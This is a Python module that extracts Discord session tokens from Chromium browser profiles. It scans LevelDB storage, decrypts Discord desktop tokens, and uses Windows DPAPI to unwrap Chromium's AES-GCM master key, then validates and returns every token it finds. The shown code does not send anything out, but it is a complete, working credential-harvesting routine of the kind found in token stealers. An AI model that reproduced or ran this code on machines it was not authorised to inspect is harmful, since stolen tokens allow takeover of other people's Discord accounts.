"""
Browser token extraction.
Extracts Discord user tokens from Chromium browser profiles.

Methods used (in order):
  1. Plaintext scan of LevelDB .ldb/.log files
     → Works for older Chrome/Discord versions and Discord desktop app
  2. Discord dQw4w9WgXcQ encrypted values
     → Discord desktop app stores tokens AES-encrypted with a prefix
  3. Chromium v10 AES-GCM encrypted localStorage
     → Chrome 80+, Edge, Brave encrypt localStorage values
     → Master key extracted via Windows DPAPI from Local State file

Returns:
  has_valid_token(profile_path)  → bool  (used by browser status check)
  extract_tokens(profile_path)   → list[str]  (all valid tokens found)
"""
from __future__ import annotations

import base64
import json
import os
import re
import sys
from pathlib import Path
from typing import Optional

# ── Token pattern ─────────────────────────────────────────────────────────────
# All Discord tokens start with base64(user_id), which always begins M or N
# (user IDs are large ints, their base64 always starts in that range)
TOKEN_RE = re.compile(
    r"[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,110}"
)

# Discord desktop encrypted token prefix
DISCORD_ENC_RE = re.compile(
    r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{20,})"
)


# ── Token validation ──────────────────────────────────────────────────────────

def _validate(token: str) -> bool:
    """Decode segment 0 and verify it is a real Discord snowflake."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        # Add padding, decode, verify large integer
        seg   = parts[0] + "=="
        uid   = int(base64.b64decode(seg).decode("utf-8", errors="ignore").strip())
        return uid > 10_000_000_000_000_000
    except Exception:
        return False


# ── DPAPI key extraction (Windows only) ──────────────────────────────────────

def _dpapi_decrypt(data: bytes) -> Optional[bytes]:
    """Decrypt bytes using Windows DPAPI (CryptUnprotectData)."""
    if sys.platform != "win32":
        return None
    try:
        import ctypes
        import ctypes.wintypes

        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        buf   = (ctypes.c_char * len(data))(*data)
        b_in  = BLOB(len(data), buf)
        b_out = BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(b_in), None, None, None, None, 0, ctypes.byref(b_out))
        if ok:
            result = bytes((ctypes.c_char * b_out.cbData).from_address(
                ctypes.addressof(b_out.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(b_out.pbData)
            return result
    except Exception:
        pass
    return None


def _get_master_key(local_state_path: Path) -> Optional[bytes]:
    """
    Extract and DPAPI-decrypt the AES-256 master key from Chromium's
    Local State file.  This key decrypts all v10-prefixed localStorage values.
    """
    try:
        if not local_state_path.is_file():
            return None
        data    = json.loads(local_state_path.read_text(encoding="utf-8"))
        enc_b64 = data["os_crypt"]["encrypted_key"]
        enc_raw = base64.b64decode(enc_b64)
        # First 5 bytes are the literal string "DPAPI"
        if enc_raw[:5] != b"DPAPI":
            return None
        return _dpapi_decrypt(enc_raw[5:])
    except Exception:
        return None


# ── AES-GCM decryption ────────────────────────────────────────────────────────

def _aes_gcm_decrypt(enc_value: bytes, key: bytes) -> Optional[str]:
    """
    Decrypt a Chromium v10-prefixed AES-256-GCM value.
    Format: b"v10" + 12-byte IV + ciphertext + 16-byte tag
    """
    try:
        if len(enc_value) < 31 or enc_value[:3] != b"v10":
            return None
        iv   = enc_value[3:15]
        data = enc_value[15:]

        # Try pycryptodome (most common on Windows)
        try:
            from Crypto.Cipher import AES
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt(data)[:-16].decode("utf-8", errors="ignore")
        except ImportError:
            pass

        # Try cryptography library
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(key).decrypt(iv, data, None).decode("utf-8", errors="ignore")
        except ImportError:
            pass

    except Exception:
        pass
    return None


# ── Scan a single file ────────────────────────────────────────────────────────

def _scan_bytes(raw: bytes, out: set[str],
                master_key: Optional[bytes] = None,
                discord_key: Optional[bytes] = None):
    """
    Extract all valid Discord tokens from raw file bytes.
    Applies all three methods.
    """
    # Method 1: plaintext
    try:
        text = raw.decode("utf-8", errors="ignore")
        for m in TOKEN_RE.finditer(text):
            tok = m.group(0)
            if _validate(tok):
                out.add(tok)

        # Method 2: Discord dQw4w9WgXcQ encrypted (Discord desktop app)
        if discord_key:
            for m in DISCORD_ENC_RE.finditer(text):
                try:
                    enc_b64 = m.group(1)
                    # Fix padding
                    enc_b64 += "=" * (-len(enc_b64) % 4)
                    enc_bytes = base64.b64decode(enc_b64)
                    dec = _aes_gcm_decrypt(enc_bytes, discord_key)
                    if dec:
                        clean = dec.strip().strip('"')
                        if _validate(clean):
                            out.add(clean)
                        for tm in TOKEN_RE.finditer(dec):
                            if _validate(tm.group(0)):
                                out.add(tm.group(0))
                except Exception:
                    pass
    except Exception:
        pass

    # Method 3: Chromium v10 AES-GCM encrypted values
    if master_key:
        for em in re.finditer(rb"v10.{12}.{16,300}", raw):
            try:
                dec = _aes_gcm_decrypt(em.group(0), master_key)
                if dec:
                    clean = dec.strip().strip('"')
                    if _validate(clean):
                        out.add(clean)
                    for tm in TOKEN_RE.finditer(dec):
                        if _validate(tm.group(0)):
                            out.add(tm.group(0))
            except Exception:
                pass


# ── Public API ────────────────────────────────────────────────────────────────

def extract_tokens(profile_path: Path) -> list[str]:
    """
    Extract all valid Discord tokens from a Chromium browser profile directory.
    
    profile_path is the profile folder itself (e.g. .../Chrome/User Data/Default)
    """
    ldb = profile_path / "Local Storage" / "leveldb"
    if not ldb.is_dir():
        return []

    # Local State lives in the parent (User Data folder)
    local_state = profile_path.parent / "Local State"

    # Get Chromium master key (for v10 encrypted values)
    master_key = _get_master_key(local_state)

    # Get Discord desktop encryption key (for dQw4w9WgXcQ: prefix)
    # Discord's Local State is at: %APPDATA%/discord/Local State
    discord_key: Optional[bytes] = None
    if sys.platform == "win32":
        discord_ls = Path(os.environ.get("APPDATA","")) / "discord" / "Local State"
        discord_key = _get_master_key(discord_ls)

    found: set[str] = set()

    for ext in ("*.ldb", "*.log"):
        for f in ldb.glob(ext):
            try:
                if f.stat().st_size > 50 * 1024 * 1024:
                    continue  # skip files >50 MB
                raw = f.read_bytes()
                _scan_bytes(raw, found,
                            master_key=master_key,
                            discord_key=discord_key)
            except PermissionError:
                pass  # browser may have file locked
            except Exception:
                pass

    return list(found)


def has_valid_token(profile_path: Path) -> bool:
    """Return True if a valid Discord token is found in this profile."""
    return len(extract_tokens(profile_path)) > 0


def extract_token_for_profile(profile_path: Path) -> Optional[str]:
    """Return the first valid token found, or None."""
    tokens = extract_tokens(profile_path)
    return tokens[0] if tokens else None
